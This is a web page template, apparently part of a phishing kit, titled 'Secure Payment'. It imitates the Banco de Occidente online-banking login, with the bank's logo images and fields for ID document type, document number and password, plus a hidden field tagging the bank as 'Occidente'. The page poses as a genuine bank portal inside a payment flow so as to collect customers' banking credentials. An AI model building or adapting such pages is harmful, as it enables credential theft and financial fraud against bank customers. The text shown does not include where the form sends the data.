<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">


    <title>Secure Payment</title>

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		
    <link rel="stylesheet" href="{{asset('assets/css/payment/occidente.css')}}">


    <style>

        *{
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }
    </style>

</head>
<body>
    <img src="{{asset('assets/img/payment/occidente/1.jfif')}}" alt="" srcset="" width="30%" style="position:absolute; right:0;">
    <br><br><br><br><br><br>
<center><img src="{{asset('assets/img/payment/occidente/logo.png')}}" alt="" srcset="" width="40%">
<br><br><br>
<a><b style="font-size:13px;">INGRESA A TU PORTAL TRANSACCIONAL</b></a></center>
<br><br>

    <label for="" style="margin-left:5%; font-size:13px; color:#556493;">Tipo de Documento</label><br>
    <select style="width:90%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%;  ">

    <option>Cedula de Ciudadania</option>
    <option>Tarjeta de identidad</option>
    <option>Cédula de extranjería</option>
    <option>Pasaporte</option>

    </select><br><br>
    <label for="" style="margin-left:5%;  font-size:13px; color:#556493;">No. de Documento</label><br>
    <input type="tel" placeholder="*Documento" name="documento" id="txtUsuario" style="width:87%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%; padding-left:10px;" required minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br><br>
    <label for=""  style="margin-left:5%; font-size:13px; color:#556493;">Contraseña</label><br>
    <input type="hidden" name="" value="Occidente" id="banco">
    <input type="password" placeholder="*Contraseña" name="clave" id="txtPass" style="width:87%; height:35px; border-radius:5px; background-color:white; color:black; border:1px solid #c7cfed; margin-left:5%;  padding-left:10px;" oninput="this.value = this.value.replace(/\s+/g, '')" required><br><br>
<!-- <a style="margin-left:5%; margin-top: 10px; font-size:13px; color:#0081ff;">Olvidé mi clave</a> -->

        <img src="{{asset('assets/img/payment/occidente/2.jfif')}}" alt="" srcset="" width="100%">


<center>
    <br><br>
<input type="submit" value="Ingresar" id="btnUsuario" style="background-color:blue; width:80%; color:white; height:35px; border-radius:5px;border:none;"></center>
</body>
</html>